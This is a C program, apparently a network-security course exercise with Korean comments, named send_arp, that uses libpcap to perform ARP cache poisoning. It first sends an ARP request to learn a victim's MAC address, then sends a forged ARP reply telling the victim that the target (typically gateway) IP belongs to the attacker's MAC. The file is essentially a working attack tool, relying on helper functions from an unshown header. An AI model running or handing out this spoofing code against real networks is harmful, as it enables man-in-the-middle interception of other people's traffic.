#include <stdio.h>
#include <unistd.h>
#include <pcap.h>
#include <stdint.h>
#include <arpa/inet.h>
#include "arp_packet.h"

void usage() {
    printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
    printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) 
{
    if (argc != 4){
        usage();
        return -1;
    }

    uint8_t attacker_mac[6];
    uint8_t attacker_ip[4];
    char * dev              = argv[1];
    char * sender_ip_string = argv[2];
    char * target_ip_string = argv[3];
    uint8_t sender_ip[4];
    uint8_t target_ip[4];
    ip_str_to_addr(sender_ip_string, sender_ip);
    ip_str_to_addr(target_ip_string, target_ip);
    get_attacker_mac_addr(attacker_mac);
    get_attacker_ip_addr(attacker_ip, dev);

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t * handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    // 첫 번째로 할 일 - sender 의 mac address 를 알아야 함

        // arp request 전송
    arp_packet arp_packet_get_sender_mac_packet;
    arp_packet_get_sender_mac_packet = arp_request_get_sender_mac_addr(attacker_mac, sender_ip, target_ip, attacker_ip);

    if(pcap_sendpacket(handle, (uint8_t *)(& arp_packet_get_sender_mac_packet), ARP_PACKET_LEN) != 0){
        printf("[Error] packet sending is failed.\n");
        return -1;
    }

        // arp response 수신
    uint8_t sender_mac[6];
    int packetNum = 0;
    while (true) {
        struct pcap_pkthdr* header;
        const u_char * packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        // packet 분석해서 arp response 인 경우 break, 아니면 계속 반복
            // arp 인지 확인

        if(ntohs(*((uint16_t *)(packet + ETHERTYPE))) == Ethertype_ARP){ // ARP packet 확인
            if(ntohs(*((uint16_t *)(packet + ARP_OPCODE))) == ARP_operation_reply){ // ARP reply 확인
                int start = ARP_DESTINATION_MAC_ADDR;
                int end = start + MAC_address_length;
                bool continue_detect = false;
                for(int i = start; i < end; i++){
                    if(*(packet + i) != attacker_mac[i - start]){
                        continue_detect = true;
                        break;
                    }
                }
                if(continue_detect) continue;
                for(int i = 0; i < 6; i++) sender_mac[i] = *(packet + ARP_SOURCE_MAC_ADDR + i);
                break;
            }
        }
    }

    // 두 번째로 할 일 - sender 에게 [ip = target ip / mac = attacker mac] 인 arp response 전송
    arp_packet arp_packet_deceive_sender;
    arp_packet_deceive_sender = arp_reply_target_ip_with_attacker_mac(attacker_mac, sender_mac, target_ip, sender_ip);

    if(pcap_sendpacket(handle, (uint8_t *)(& arp_packet_deceive_sender), ARP_PACKET_LEN) != 0){
        printf("[Error] packet sending is failed.\n");
        return -1;
    }

    return 0;
}
